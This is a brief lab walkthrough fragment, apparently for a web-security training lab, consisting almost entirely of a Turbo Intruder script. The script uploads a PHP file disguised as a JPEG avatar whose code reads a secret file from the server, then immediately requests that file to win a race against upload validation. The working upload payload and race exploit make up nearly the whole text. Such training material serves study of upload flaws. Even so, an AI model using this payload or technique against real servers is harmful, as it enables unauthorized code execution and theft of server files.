I started off using the test.py module.
```python3
# This is just for making sure the engine works during development
# Launch with java -jar build/libs/turbo-intruder-all.jar resources/examples/test.py /dev/null z z
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://0ab300540400b7ebc016c718006200a4.web-security-academy.net:443',
                           concurrentConnections=2,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    noPayload = '''POST /my-account/avatar HTTP/2
Host: 0ab300540400b7ebc016c718006200a4.web-security-academy.net
Cookie: session=o5g8B4eroNhmwV0Knwvn36O47HQtUcrU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------69542980738213777741386124383
Content-Length: 533
Origin: https://0ab300540400b7ebc016c718006200a4.web-security-academy.net
Referer: https://0ab300540400b7ebc016c718006200a4.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------69542980738213777741386124383
Content-Disposition: form-data; name="avatar"; filename="2.php"
Content-Type: image/jpeg


<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------69542980738213777741386124383
Content-Disposition: form-data; name="user"

wiener
-----------------------------69542980738213777741386124383
Content-Disposition: form-data; name="csrf"

DBT35uWFYFIko3I8funzWmmyBNDjQYvW
-----------------------------69542980738213777741386124383--

'''
    engine.queue(noPayload)

    onePayload = '''GET /files/avatars/2.php HTTP/2
Host: 0ab300540400b7ebc016c718006200a4.web-security-academy.net
Cookie: session=o5g8B4eroNhmwV0Knwvn36O47HQtUcrU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers



'''
    engine.queue(onePayload)


def handleResponse(req, interesting):
    table.add(req)
```
